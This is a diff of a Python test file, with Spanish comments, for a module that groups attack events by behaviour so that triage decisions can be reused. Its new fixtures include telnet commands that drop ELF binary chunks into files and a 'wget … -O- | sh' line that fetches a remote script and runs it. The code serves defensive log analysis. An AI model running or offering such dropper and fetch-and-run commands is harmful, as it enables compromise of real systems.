@@ -1,9 +1,9 @@
 """La reutilización de decisiones entre eventos de la misma conducta.
 
-Es la pieza que vuelve pagable el atraso: 71.654 eventos del bus son 2.088 firmas distintas, así
-que triar por conducta en lugar de por evento baja el costo de unos 35 dólares a un par, y el
-régimen continuo de ~900 llamadas diarias a unas 25. Pero copiar una decisión es afirmar algo que no
-se razonó, y eso solo es defendible si se cumplen unas cuantas cosas. Acá están fijadas.
+Es la pieza que vuelve pagable el atraso: las firmas distintas son una fracción chica de los
+eventos del bus, así que triar por conducta en lugar de por evento baja el costo y las llamadas
+diarias a una fracción. Pero copiar una decisión es afirmar algo que no se razonó, y eso solo es
+defendible si se cumplen unas cuantas cosas. Acá están fijadas.
 
 La que sostiene todo lo demás es la invariante del piso: la firma incluye la categoría y el
 resultado, y son los dos únicos campos de los que dependen el piso y el techo de severidad. Una
@@ -13,6 +13,7 @@ misma firma. Sin eso habría que confiar en que el modelo sea consistente, y no 
 
 from __future__ import annotations
 
+import hashlib
 import json
 from typing import Any
 
@@ -92,7 +93,7 @@ def test_el_protocolo_parte_la_firma() -> None:
 
 @pytest.mark.parametrize("campo", modulo_firma.CAMPOS)
 def test_cada_campo_de_la_conducta_parte_la_firma(campo: str) -> None:
-    """Cambiar cualquiera de los seis da otra firma. Si no, se estarían mezclando conductas."""
+    """Cambiar cualquiera de los siete da otra firma. Si no, se estarían mezclando conductas."""
     base = _evento()
     distinto = _evento(**{campo: "otra-cosa"})
     assert modulo_firma.de_evento(base) != modulo_firma.de_evento(distinto)
@@ -103,6 +104,39 @@ def test_el_separador_no_deja_colisionar_campos_corridos() -> None:
     uno = modulo_firma.de_evento(_evento(user="ab", command=""))
     otro = modulo_firma.de_evento(_evento(user="a", command="b"))
     assert uno != otro
+
+
+def test_los_trozos_de_un_mismo_binario_comparten_firma() -> None:
+    """Cada trozo trae otros bytes y el último suele ser más corto, pero la conducta es una sola."""
+    primero = _evento(protocol="telnet", command=r"echo -ne '\x7f\x45\x4c\x46\x01\x01'>>./catdpckn")
+    ultimo = _evento(protocol="telnet", command=r"echo -ne '\xA0\x15'>>./catdpckn")
+    assert modulo_firma.de_evento(primero) == modulo_firma.de_evento(ultimo)
+
+
+def test_el_archivo_y_la_redireccion_siguen_partiendo_la_firma() -> None:
+    """Crear el archivo, agregarle o escribir en otro no se juntan: solo se ignoran los bytes."""
+    agrega = modulo_firma.de_evento(_evento(command=r"echo -ne '\x7f\x45'>>./catdpckn"))
+    crea = modulo_firma.de_evento(_evento(command=r"echo -ne '\x7f\x45'>./catdpckn"))
+    otro = modulo_firma.de_evento(_evento(command=r"echo -ne '\x7f\x45'>>./catiyosh"))
+    assert len({agrega, crea, otro}) == 3
+
+
+def test_el_texto_alrededor_de_los_escapes_sigue_contando() -> None:
+    uno = modulo_firma.de_evento(_evento(command=r'echo -e "\x41\x42 hola"'))
+    mismo = modulo_firma.de_evento(_evento(command=r'echo -e "\x43 hola"'))
+    otro = modulo_firma.de_evento(_evento(command=r'echo -e "\x41\x42 chau"'))
+    assert uno == mismo
+    assert uno != otro
+
+
+def test_un_comando_sin_escapes_firma_igual_que_con_los_campos_sin_tocar() -> None:
+    """La marca no puede mover ninguna otra firma, o el repertorio guardado dejaría de valer."""
+    evento = _evento(command="cd /tmp; wget http://198.51.100.7/x.sh -O- | sh")
+    crudo = modulo_firma.SEPARADOR.join(
+        str(getattr(evento, campo, "") or "") for campo in modulo_firma.CAMPOS
+    )
+    esperado = hashlib.sha256(crudo.encode("utf-8")).hexdigest()[: modulo_firma.LARGO]
+    assert modulo_firma.de_evento(evento) == esperado
 
 
 # ---- la invariante que vuelve correcta la reutilización --------------------------------------
@@ -235,7 +269,7 @@ def test_no_registra_si_el_almacen_falla() -> None:
 
 
 def test_no_registra_una_decision_no_concluyente() -> None:
-    """Propagar un ciclo fallido le pondría el mismo fracaso a las 6.588 repeticiones."""
+    """Propagar un ciclo fallido le pondría el mismo fracaso a cada repetición de la firma."""
     repertorio, almacen = RepertorioFalso(), AlmacenFalso()
     persistencia.guardar(
         _estado(firma="f1", motivo_de_corte="sin_contexto"),
